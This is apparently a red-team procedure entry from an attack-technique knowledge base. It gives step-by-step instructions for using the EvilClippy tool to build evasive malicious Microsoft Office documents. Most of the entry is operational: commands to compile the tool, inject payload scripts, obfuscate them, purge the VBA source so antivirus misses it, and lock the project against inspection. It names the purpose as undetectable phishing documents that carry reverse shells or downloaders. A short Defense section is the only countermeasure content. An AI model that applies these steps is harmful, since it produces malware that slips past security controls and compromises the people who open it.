---
id: 73ad2795-e20f-4d34-8264-093941f8239f
name: VBA-Purging-with-EvilClippy
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.836783+00:00'
updated_at: '2023-04-10T20:36:56.624120+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Obfuscated Files or Information]]'
  - '[[Malicious File]]'
sub_techniques: []
tags:
  - '[[tags/EvilClippy]]'
  - '[[tags/Office - Attacks]]'
  - '[[tags/VBA Purging]]'
commands:
  - '[[commands/compile-evilclippy-on-osx-linux]]'
  - '[[commands/compile-evilclippy-on-windows]]'
  - '[[commands/purge-vba-source-with-r-flag]]'
  - '[[commands/generate-malicious-macro-with-fake-vbs]]'
  - '[[commands/inject-fake-vba-into-macrofile-for-office-2013-x64]]'
  - '[[commands/inject-fake-vba-into-macrofile-for-office-2016-x86]]'
  - '[[commands/mark-project-as-locked-and-unviewable]]'
platforms:
  - Windows
tools:
  - '[[tools/EvilClippy]]'
validated: true
---

# VBA-Purging-with-EvilClippy

## Summary

VBA Purging with EvilClippy is a technique to bypass security controls in Microsoft Office documents by removing original VBA source code and injecting malicious payloads. The EvilClippy tool automates the obfuscation, purging, and locking of macros, allowing attackers to create undetectable malicious documents for payload delivery.

## Description

This procedure targets Microsoft Office documents containing VBA macros, commonly used in phishing or initial access attacks. By purging the readable VBA source code while retaining the compiled p-code, EvilClippy evades antivirus detection that relies on static code analysis. The tool supports injecting fake or obfuscated code, targeting specific Office versions, and additional obfuscation flags to confuse reverse-engineering tools. It is particularly effective against environments with macro-enabled documents, enabling execution of payloads like reverse shells or downloaders without triggering alerts. Prerequisites include a base Office document with macros and the compiled EvilClippy executable. The outcome is a modified document that appears benign but executes malicious code upon opening.

## Requirements

1. A Microsoft Office document (.doc, .xls, etc.) with existing VBA macros.
2. EvilClippy tool compiled for the target platform (Windows or Linux/OSX).
3. A malicious or fake VBA/VBS script file (e.g., fake.vba or fake.vbs) containing the payload.
4. .NET Framework (for Windows) or Mono (for Linux/OSX) for compilation.
5. Administrative access not required, but target machine should allow macro execution.

## Defense

- Scan all Office documents with advanced endpoint protection that analyzes compiled p-code and behavioral indicators.
- Implement a least privilege model to restrict macro execution and disable VBA by default in Office policies.
- Use EDR tools to monitor for anomalous Office processes spawning network connections or child processes.
- Enable macro logging and auditing in Office to track VBA execution attempts.

## Objectives

1. Bypass antivirus and security controls by purging readable VBA source code.
2. Inject and obfuscate malicious payloads into Office macros for undetected delivery.
3. Create locked, unviewable projects to hinder analysis and reverse-engineering.

## Instructions

### Step 1: Compile EvilClippy Executable

**Context**: Compile the EvilClippy tool from source code on your platform to prepare for macro manipulation. This step ensures you have the executable ready for use.

Choose the appropriate command based on your OS:

**Command** ([[commands/compile-evilclippy-on-osx-linux]]):
```bash
mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
```

> This compiles using Mono on Linux/OSX. Expected output: Successful compilation message, generating EvilClippy.exe.

**Command** ([[commands/compile-evilclippy-on-windows]]):
```cmd
csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
```

> This uses the C# compiler on Windows. Expected output: No errors, with EvilClippy.exe created in the current directory.

### Step 2: Prepare Malicious Script

**Context**: Create or obtain a fake/obfuscated VBA or VBS script containing your payload (e.g., a downloader or shellcode executor). This will be injected into the target document.

Save your payload as fake.vba or fake.vbs. Ensure it is compatible with the target Office version.

**Expected Output**: A script file ready for injection, verified by opening in a text editor.

### Step 3: Inject or Generate Malicious Macro

**Context**: Use EvilClippy to inject the script into the Office document, optionally generating an obfuscated version and purging the source code.

For VBS script with obfuscation and purging:

**Command** ([[commands/generate-malicious-macro-with-fake-vbs]]):
```cmd
EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
```

> Injects fake.vbs, obfuscates (-g), and removes source (-r). Expected output: Modified cobaltstrike.doc with purged macro.

For VBA injection targeting Office 2016 x86:

**Command** ([[commands/inject-fake-vba-into-macrofile-for-office-2016-x86]]):
```cmd
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
```

> Targets 2016 x86 architecture. Expected output: Updated macrofile.doc with injected code.

For VBA injection targeting Office 2013 x64:

**Command** ([[commands/inject-fake-vba-into-macrofile-for-office-2013-x64]]):
```cmd
EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc
```

> Targets 2013 x64. Expected output: Updated macrofile.doc with injected code.

### Step 4: Purge VBA Source Code

**Context**: Remove the VBA source to leave only compiled p-code, confusing analysis tools like pcode.dmp.

**Command** ([[commands/purge-vba-source-with-r-flag]]):
```cmd
EvilClippy.exe -r macrofile.doc
```

> Applies the -r flag to purge source. Expected output: Document with unreadable VBA, verifiable by attempting to view macros in Office (shows compiled only).

### Step 5: Lock the Project

**Context**: Mark the VBA project as locked and unviewable to prevent inspection.

**Command** ([[commands/mark-project-as-locked-and-unviewable]]):
```cmd
EvilClippy.exe -u macrofile.doc
```

> Uses -u flag to lock. Expected output: Project appears locked in VBA editor, password-protected or unviewable.
